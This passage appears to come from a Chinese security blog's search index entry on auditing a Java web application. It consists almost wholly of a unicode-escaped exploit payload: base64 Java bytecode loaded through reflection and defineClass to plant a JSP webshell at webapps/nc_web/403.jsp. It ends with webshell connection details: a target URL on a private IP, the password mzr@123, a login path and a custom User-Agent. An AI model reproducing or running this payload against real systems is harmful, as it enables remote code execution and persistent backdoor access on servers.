41\\u0053\\u0051\\u0042\\u004a\\u0051\\u0041\\u0042\\u0041\\u0042\\u0045\\u0041\\u004c\\u0051\\u0045\\u006d\\u0041\\u0053\\u0063\\u0041\\u0041\\u0067\\u0041\\u0061\\u0041\\u0043\\u0051\\u0042\\u004b\\u0041\\u0045\\u0070\\u0041\\u0041\\u004d\\u0041\\u0049\\u0051\\u0041\\u0064\\u0041\\u0053\\u006f\\u0041\\u0070\\u0041\\u0041\\u0045\\u0041\\u0043\\u006f\\u0041\\u0046\\u0041\\u0045\\u0072\\u0041\\u0051\\u0049\\u0041\\u0042\\u0051\\u0041\\u006f\\u0041\\u0041\\u0041\\u0041\\u0048\\u0041\\u0041\\u0043\\u002f\\u0077\\u0041\\u0068\\u0041\\u0041\\u0055\\u0048\\u0041\\u004d\\u0067\\u0048\\u0041\\u0053\\u0030\\u0048\\u0041\\u0053\\u0038\\u0048\\u0041\\u0054\\u0045\\u0048\\u0041\\u004d\\u0067\\u0041\\u0041\\u0050\\u0077\\u0041\\u0046\\u0077\\u0045\\u0041\\u0043\\u0077\\u0041\\u0041\\u0041\\u0041\\u0051\\u0041\\u0041\\u0051\\u0041\\u004e\\u0041\\u0041\\u0067\\u0041\\u005a\\u0077\\u0042\\u005a\\u0041\\u0041\\u0049\\u0041\\u0042\\u0077\\u0041\\u0041\\u0041\\u0046\\u0063\\u0041\\u0041\\u0067\\u0041\\u0044\\u0041\\u0041\\u0041\\u0041\\u0045\\u0053\\u006f\\u0072\\u0075\\u0041\\u0046\\u004d\\u0054\\u0053\\u0077\\u0045\\u0074\\u0067\\u0046\\u0050\\u004c\\u0043\\u0071\\u0032\\u0041\\u0056\\u0043\\u0077\\u0041\\u0041\\u0041\\u0041\\u0041\\u0067\\u0041\\u005a\\u0041\\u0041\\u0041\\u0041\\u0044\\u0067\\u0041\\u0044\\u0041\\u0041\\u0041\\u0041\\u0070\\u0067\\u0041\\u0047\\u0041\\u004b\\u0063\\u0041\\u0043\\u0077\\u0043\\u006f\\u0041\\u0042\\u006f\\u0041\\u0041\\u0041\\u0041\\u0067\\u0041\\u0041\\u004d\\u0041\\u0041\\u0041\\u0041\\u0052\\u0041\\u0055\\u0055\\u0041\\u0048\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0045\\u0051\\u0046\\u0047\\u0041\\u0051\\u0051\\u0041\\u0041\\u0051\\u0041\\u0047\\u0041\\u0041\\u0073\\u0042\\u0052\\u0077\\u0046\\u0049\\u0041\\u0041\\u0049\\u0041\\u0043\\u0077\\u0041\\u0041\\u0041\\u0041\\u0051\\u0041\\u0041\\u0051\\u0041\\u0059\\u0041\\u0041\\u0067\\u0042\\u0053\\u0051\\u0046\\u004b\\u0041\\u0041\\u0049\\u0041\\u0042\\u0077\\u0041\\u0041\\u0041\\u004d\\u0063\\u0041\\u0041\\u0077\\u0041\\u0045\\u0041\\u0041\\u0041\\u0041\\u004b\\u0043\\u0071\\u0032\\u0041\\u0048\\u0070\\u004e\\u004c\\u004d\\u0059\\u0041\\u0047\\u0053\\u0077\\u0072\\u0074\\u0067\\u0046\\u0058\\u0054\\u0069\\u0030\\u0045\\u0074\\u0067\\u0046\\u0050\\u004c\\u0062\\u0042\\u004f\\u004c\\u004c\\u0059\\u0042\\u0057\\u006b\\u0032\\u006e\\u002f\\u002b\\u006d\\u0037\\u0041\\u0056\\u004a\\u005a\\u004b\\u0037\\u0063\\u0042\\u0057\\u0037\\u0038\\u0041\\u0041\\u0051\\u0041\\u004a\\u0041\\u0042\\u0055\\u0041\\u0046\\u0067\\u0046\\u0053\\u0041\\u0041\\u0051\\u0041\\u0047\\u0051\\u0041\\u0041\\u0041\\u0043\\u0059\\u0041\\u0043\\u0051\\u0041\\u0041\\u0041\\u004b\\u0077\\u0041\\u0042\\u0051\\u0043\\u0074\\u0041\\u0041\\u006b\\u0041\\u0072\\u0077\\u0041\\u0050\\u0041\\u004c\\u0041\\u0041\\u0046\\u0041\\u0043\\u0078\\u0041\\u0042\\u0059\\u0041\\u0073\\u0067\\u0041\\u0058\\u0041\\u004c\\u004d\\u0041\\u0048\\u0041\\u0043\\u0030\\u0041\\u0042\\u0038\\u0041\\u0074\\u0067\\u0041\\u0061\\u0041\\u0041\\u0041\\u0041\\u004e\\u0041\\u0041\\u0046\\u0041\\u0041\\u0038\\u0041\\u0042\\u0077\\u0046\\u0048\\u0041\\u0055\\u0067\\u0041\\u0041\\u0077\\u0041\\u0058\\u0041\\u0041\\u0055\\u0041\\u0053\\u0067\\u0046\\u0054\\u0041\\u0041\\u004d\\u0041\\u0041\\u0041\\u0041\\u006f\\u0041\\u0055\\u0055\\u0041\\u0048\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u004b\\u0041\\u0046\\u0047\\u0041\\u0051\\u0051\\u0041\\u0041\\u0051\\u0041\\u0046\\u0041\\u0043\\u004d\\u0041\\u0070\\u0077\\u0043\\u006f\\u0041\\u0041\\u0049\\u0041\\u0049\\u0067\\u0041\\u0041\\u0041\\u0041\\u0077\\u0041\\u0041\\u0051\\u0041\\u0046\\u0041\\u0043\\u004d\\u0041\\u0070\\u0077\\u0045\\u0051\\u0041\\u0041\\u0049\\u0041\\u004b\\u0041\\u0041\\u0041\\u0041\\u0041\\u0030\\u0041\\u0041\\u002f\\u0077\\u0041\\u0042\\u0051\\u0063\\u0041\\u0066\\u0046\\u0041\\u0048\\u0041\\u0056\\u0049\\u0049\\u0041\\u0041\\u0073\\u0041\\u0041\\u0041\\u0041\\u0045\\u0041\\u0041\\u0045\\u0042\\u0055\\u0067\\u0041\\u006f\\u0041\\u0046\\u0067\\u0041\\u0057\\u0051\\u0041\\u0043\\u0041\\u0041\\u0063\\u0041\\u0041\\u0041\\u0042\\u0043\\u0041\\u0041\\u0051\\u0041\\u0041\\u0067\\u0041\\u0041\\u0041\\u0041\\u0034\\u0071\\u004b\\u0077\\u004f\\u0039\\u0041\\u0048\\u0077\\u0044\\u0076\\u0051\\u0041\\u0045\\u0075\\u0041\\u0044\\u0074\\u0073\\u0041\\u0041\\u0041\\u0041\\u0041\\u0049\\u0041\\u0047\\u0051\\u0041\\u0041\\u0041\\u0041\\u0059\\u0041\\u0041\\u0051\\u0041\\u0041\\u0041\\u004c\\u006f\\u0041\\u0047\\u0067\\u0041\\u0041\\u0041\\u0042\\u0059\\u0041\\u0041\\u0067\\u0041\\u0041\\u0041\\u0041\\u0034\\u0042\\u0058\\u0041\\u0041\\u0063\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u004f\\u0041\\u0056\\u0030\\u0042\\u0042\\u0041\\u0041\\u0042\\u0041\\u0041\\u0073\\u0041\\u0041\\u0041\\u0041\\u0049\\u0041\\u0041\\u004d\\u0041\\u006e\\u0041\\u0043\\u0061\\u0041\\u004a\\u0034\\u0041\\u004b\\u0051\\u0042\\u0059\\u0041\\u004f\\u0073\\u0041\\u0041\\u0067\\u0041\\u0048\\u0041\\u0041\\u0041\\u0043\\u0046\\u0077\\u0041\\u0044\\u0041\\u0041\\u006b\\u0041\\u0041\\u0041\\u0044\\u004b\\u004b\\u0073\\u0045\\u0041\\u0066\\u004a\\u006b\\u0041\\u0043\\u0069\\u0072\\u0041\\u0041\\u0048\\u0079\\u006e\\u0041\\u0041\\u0063\\u0071\\u0074\\u0067\\u0042\\u0036\\u004f\\u0067\\u0051\\u0042\\u004f\\u0067\\u0055\\u005a\\u0042\\u0044\\u006f\\u0047\\u0047\\u0051\\u0058\\u0048\\u0041\\u0047\\u0051\\u005a\\u0042\\u0073\\u0059\\u0041\\u0058\\u0079\\u007a\\u0048\\u0041\\u0045\\u004d\\u005a\\u0042\\u0072\\u0059\\u0042\\u0061\\u007a\\u006f\\u0048\\u0041\\u007a\\u0059\\u0049\\u0046\\u0051\\u0067\\u005a\\u0042\\u0037\\u0036\\u0069\\u0041\\u0043\\u0034\\u005a\\u0042\\u0078\\u0055\\u0049\\u004d\\u0072\\u0059\\u0042\\u0062\\u0043\\u0075\\u0032\\u0041\\u0057\\u002b\\u005a\\u0041\\u0042\\u006b\\u005a\\u0042\\u0078\\u0055\\u0049\\u004d\\u0072\\u0059\\u0042\\u0063\\u0037\\u0036\\u0061\\u0041\\u0041\\u0030\\u005a\\u0042\\u0078\\u0055\\u0049\\u004d\\u006a\\u006f\\u0046\\u0070\\u0077\\u0041\\u004a\\u0068\\u0041\\u0067\\u0042\\u0070\\u002f\\u002f\\u0051\\u0070\\u0077\\u0041\\u004d\\u0047\\u0051\\u0059\\u0072\\u004c\\u004c\\u0059\\u0041\\u0030\\u0054\\u006f\\u0046\\u0070\\u002f\\u002b\\u0070\\u004f\\u0067\\u0063\\u005a\\u0042\\u0072\\u0059\\u0042\\u0057\\u006a\\u006f\\u0047\\u0070\\u002f\\u002b\\u0064\\u0047\\u0051\\u0058\\u0048\\u0041\\u0041\\u0079\\u0037\\u0041\\u004a\\u0078\\u005a\\u004b\\u0037\\u0063\\u0042\\u0064\\u004c\\u0038\\u005a\\u0042\\u0051\\u0053\\u0032\\u0041\\u004e\\u0063\\u0071\\u0077\\u0051\\u0042\\u0038\\u006d\\u0051\\u0041\\u0061\\u0047\\u0051\\u0055\\u0042\\u004c\\u0062\\u0059\\u0041\\u0033\\u0037\\u0041\\u0036\\u0042\\u0037\\u0073\\u0041\\u006c\\u0056\\u006b\\u005a\\u0042\\u0037\\u0059\\u0042\\u0064\\u0037\\u0063\\u0042\\u0065\\u004c\\u0038\\u005a\\u0042\\u0053\\u006f\\u0074\\u0074\\u0067\\u0044\\u0066\\u0073\\u0044\\u006f\\u0048\\u0075\\u0077\\u0043\\u0056\\u0057\\u0052\\u006b\\u0048\\u0074\\u0067\\u0046\\u0033\\u0074\\u0077\\u0046\\u0034\\u0076\\u0077\\u0041\\u0044\\u0041\\u0043\\u0055\\u0041\\u0063\\u0067\\u0042\\u0031\\u0041\\u004a\\u0077\\u0041\\u006e\\u0041\\u0043\\u006a\\u0041\\u004b\\u0051\\u0041\\u006d\\u0067\\u0043\\u007a\\u0041\\u004c\\u006f\\u0041\\u0075\\u0077\\u0043\\u0061\\u0041\\u0041\\u004d\\u0041\\u0047\\u0051\\u0041\\u0041\\u0041\\u0047\\u0034\\u0041\\u0047\\u0077\\u0041\\u0041\\u0041\\u004c\\u0034\\u0041\\u0046\\u0041\\u0043\\u002f\\u0041\\u0042\\u0063\\u0041\\u0077\\u0051\\u0041\\u0062\\u0041\\u004d\\u0049\\u0041\\u004a\\u0051\\u0044\\u0045\\u0041\\u0043\\u006b\\u0041\\u0078\\u0067\\u0041\\u0077\\u0041\\u004d\\u0063\\u0041\\u004f\\u0077\\u0044\\u0049\\u0041\\u0046\\u0059\\u0041\\u0079\\u0051\\u0042\\u0064\\u0041\\u004d\\u006f\\u0041\\u0059\\u0041\\u0044\\u0048\\u0041\\u0047\\u0059\\u0041\\u007a\\u0051\\u0042\\u0070\\u0041\\u004d\\u0034\\u0041\\u0063\\u0067\\u0044\\u0053\\u0041\\u0048\\u0055\\u0041\\u0030\\u0041\\u0042\\u0033\\u0041\\u004e\\u0045\\u0041\\u0066\\u0067\\u0044\\u0053\\u0041\\u0049\\u0045\\u0041\\u0031\\u0041\\u0043\\u0047\\u0041\\u004e\\u0055\\u0041\\u006a\\u0077\\u0044\\u0058\\u0041\\u004a\\u0055\\u0041\\u0032\\u0041\\u0043\\u0063\\u0041\\u004e\\u006f\\u0041\\u0070\\u0041\\u0044\\u0062\\u0041\\u004b\\u0059\\u0041\\u0033\\u0041\\u0043\\u007a\\u0041\\u004f\\u0041\\u0041\\u0075\\u0077\\u0044\\u0068\\u0041\\u004c\\u0030\\u0041\\u0034\\u0067\\u0041\\u0061\\u0041\\u0041\\u0041\\u0041\\u0065\\u0067\\u0041\\u004d\\u0041\\u0044\\u004d\\u0041\\u004d\\u0077\\u0045\\u0042\\u0041\\u0051\\u0049\\u0041\\u0043\\u0041\\u0041\\u0077\\u0041\\u0044\\u0059\\u0042\\u0058\\u0067\\u0046\\u0066\\u0041\\u0041\\u0063\\u0041\\u0064\\u0077\\u0041\\u0048\\u0041\\u0045\\u006f\\u0042\\u0059\\u0041\\u0041\\u0048\\u0041\\u004b\\u0059\\u0041\\u0044\\u0051\\u0042\\u004b\\u0041\\u0057\\u0045\\u0041\\u0042\\u0077\\u0043\\u0039\\u0041\\u0041\\u0030\\u0041\\u0053\\u0067\\u0046\\u0068\\u0041\\u0041\\u0063\\u0041\\u0041\\u0041\\u0044\\u004b\\u0041\\u0055\\u0055\\u0041\\u0048\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0079\\u0067\\u0046\\u0064\\u0041\\u0051\\u0051\\u0041\\u0041\\u0051\\u0041\\u0041\\u0041\\u004d\\u006f\\u0042\\u0059\\u0067\\u0046\\u006a\\u0041\\u0041\\u0049\\u0041\\u0041\\u0041\\u0044\\u004b\\u0041\\u0057\\u0051\\u0041\\u0034\\u0051\\u0041\\u0044\\u0041\\u0042\\u0051\\u0041\\u0074\\u0067\\u0043\\u006e\\u0041\\u004b\\u0067\\u0041\\u0042\\u0041\\u0041\\u0058\\u0041\\u004c\\u004d\\u0042\\u005a\\u0051\\u0043\\u006d\\u0041\\u0041\\u0055\\u0041\\u0047\\u0077\\u0043\\u0076\\u0041\\u0057\\u0059\\u0041\\u0071\\u0041\\u0041\\u0047\\u0041\\u0043\\u0067\\u0041\\u0041\\u0041\\u0041\\u0076\\u0041\\u0041\\u0034\\u004f\\u0051\\u0077\\u0063\\u0041\\u0066\\u0050\\u0034\\u0041\\u0043\\u0041\\u0063\\u0041\\u0066\\u0041\\u0063\\u0041\\u0030\\u0077\\u0063\\u0041\\u0066\\u0050\\u0030\\u0041\\u0046\\u0077\\u0063\\u0042\\u005a\\u0077\\u0045\\u0073\\u002b\\u0051\\u0041\\u0046\\u0041\\u0067\\u0068\\u0043\\u0042\\u0077\\u0043\\u0063\\u0043\\u0077\\u0031\\u0055\\u0042\\u0077\\u0043\\u0061\\u0044\\u006b\\u0063\\u0048\\u0041\\u004a\\u006f\\u0041\\u0043\\u0077\\u0041\\u0041\\u0041\\u0041\\u0067\\u0041\\u0041\\u0077\\u0043\\u0063\\u0041\\u004a\\u0034\\u0041\\u006d\\u0067\\u0041\\u0049\\u0041\\u0058\\u006b\\u0041\\u0046\\u0067\\u0041\\u0042\\u0041\\u0041\\u0063\\u0041\\u0041\\u0041\\u0041\\u006c\\u0041\\u0041\\u0049\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u0041\\u006d\\u0037\\u0041\\u0041\\u004a\\u005a\\u0074\\u0077\\u0046\\u0036\\u0056\\u0037\\u0045\\u0041\\u0041\\u0041\\u0041\\u0042\\u0041\\u0042\\u006b\\u0041\\u0041\\u0041\\u0041\\u004b\\u0041\\u0041\\u0049\\u0041\\u0041\\u0041\\u0041\\u0068\\u0041\\u0041\\u0067\\u0041\\u0049\\u0067\\u0041\\u0041\\u005c\\u0027\\u003b\\u0076\\u0061\\u0072\\u0020\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u003b\\u0074\\u0072\\u0079\\u007b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u005c\\u0027\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0024\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u005c\\u0027\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u005c\\u0027\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u005c\\u0027\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0043\\u006c\\u007a\\u0029\\u003b\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u005c\\u0027\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u005c\\u0027\\u002c\\u0020\\u0063\\u006c\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u002c\\u0020\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u003b\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u0065\\u0065\\u0029\\u0020\\u007b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0076\\u0061\\u0072\\u0020\\u0064\\u0061\\u0074\\u0061\\u0074\\u0079\\u0070\\u0065\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\\u0043\\u006c\\u007a\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006a\\u0061\\u0076\\u0061\\u0078\\u002e\\u0078\\u006d\\u006c\\u002e\\u0062\\u0069\\u006e\\u0064\\u002e\\u0044\\u0061\\u0074\\u0061\\u0074\\u0079\\u0070\\u0065\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\\u005c\\u0027\\u0029\\u003b\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0020\\u003d\\u0020\\u0064\\u0061\\u0074\\u0061\\u0074\\u0079\\u0070\\u0065\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\\u0043\\u006c\\u007a\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u005c\\u0027\\u0070\\u0061\\u0072\\u0073\\u0065\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0042\\u0069\\u006e\\u0061\\u0072\\u0079\\u005c\\u0027\\u002c\\u0020\\u0063\\u006c\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0064\\u0061\\u0074\\u0061\\u0074\\u0079\\u0070\\u0065\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\\u0043\\u006c\\u007a\\u002c\\u0020\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u003b\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u0065\\u0065\\u0065\\u0029\\u0020\\u007b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0061\\u007a\\u007a\\u0031\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u0073\\u0075\\u006e\\u002e\\u006d\\u0069\\u0073\\u0063\\u002e\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u005c\\u0027\\u0029\\u003b\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u007a\\u007a\\u0031\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u002e\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u003b\\u007d\\u007d\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u005c\\u0027\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0042\\u0079\\u0074\\u0065\\u0041\\u0072\\u0072\\u0061\\u0079\\u0020\\u003d\\u0020\\u0028\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u005c\\u0027\\u0061\\u005c\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0049\\u006e\\u0074\\u0020\\u003d\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u002e\\u0054\\u0059\\u0050\\u0045\\u003b\\u0076\\u0061\\u0072\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u005c\\u0027\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u005c\\u0027\\u002c\\u0020\\u005b\\u0063\\u006c\\u0073\\u0042\\u0079\\u0074\\u0065\\u0041\\u0072\\u0072\\u0061\\u0079\\u002c\\u0020\\u0063\\u006c\\u0073\\u0049\\u006e\\u0074\\u002c\\u0020\\u0063\\u006c\\u0073\\u0049\\u006e\\u0074\\u005d\\u0029\\u003b\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0061\\u007a\\u007a\\u0020\\u003d\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002c\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u002c\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0030\\u0029\\u002c\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0029\\u0029\\u003b\\u0063\\u006c\\u0061\\u007a\\u007a\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u003b\\u007d\\u0027\\u0029\\u007d&quot;,&quot;webapps/nc_web/403.jsp&quot;]&#125;\n\n\n\n\n\n\n\n\n先访问 http://172.20.10.190:8080/403.jsp，再连接\n密码: mzr@123地址: /nccloud/resources/uap/rbac/login/main/index.html请求头: User-Agent: Kaqinesfo脚本类型: JSP\n\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]}]